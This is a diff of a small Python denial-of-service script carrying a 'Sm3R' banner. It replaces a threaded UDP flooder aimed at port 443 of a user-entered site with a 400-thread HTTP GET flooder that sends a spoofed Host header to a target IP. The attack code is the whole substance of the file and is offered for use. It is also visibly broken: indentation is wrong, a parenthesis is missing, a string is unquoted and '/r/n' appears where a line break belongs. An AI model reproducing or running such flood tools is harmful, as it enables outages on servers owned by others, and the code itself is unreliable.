@@ -16,32 +16,43 @@ Version 1.0 (2023)
 │ Telegram : t.me/imsmer │t.me/sm3rmc
 └─────────────────────────────────────────────┘''')
 
-import time
-import socket
-import sys
-import _thread
+import socket, os, time
+import threading
 
-site = input("_>address site ra vared knid => ")
-thread_count = input("_>qodrat ra vared knid => ")
-ip = socket.gethostbyname(site)
-UDP_PORT = 443
-MESSAGE = '@sm3rmc!!!'
-print("_>IP HADAF:", ip)
-print("_>PORT HADAF:", UDP_PORT)
-time.sleep(3)
-def ddos(i):
-    while 1:
-for i in range(1000):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT)
-        
-        print("           •HAMLE SHOD•")
-       
-for i in range(int(thread_count)):
-    try:
-        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
-    except KeyboardInterrupt:
-        sys.exit(0)
-while 1:
-    pass
-print(''' c0d3d By Sm3R ''')
+
+
+
+target = input("Enter target ip -->")
+fake_ip = "40.199.23.23"
+port = 80
+
+counter = 0
+
+def attack():
+    while True:
+       s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+       s.connect((target,port))
+       s.sendto(("GET /"+target+HTTP/1.1/r/n).encode("ascii"),(target,port))
+       s.sendto(("Host:"+fake_ip+"/r/n/r/n").encode("ascii"),(target,port))
+       s.close()
+	
+	global counter
+	counter += 1
+	print(f"packet {str(counter)} sent ! /n")
+	
+	
+	print(" [                  ]  0% ")
+	time.sleep(1)
+	print(" [••••••          ]  20% ")
+	time.sleep(1)
+	print(" [•••••••••      ]  60% ")
+	time.sleep(1)
+	print(" [•••••••••••••]  100% ")
+	time.sleep(1)
+	print("Attack Start . . . !")
+	time.sleep(1)
+	
+	
+for i in range(400):
+	thread = threading.Thread(target=attack)
+	thread.start()
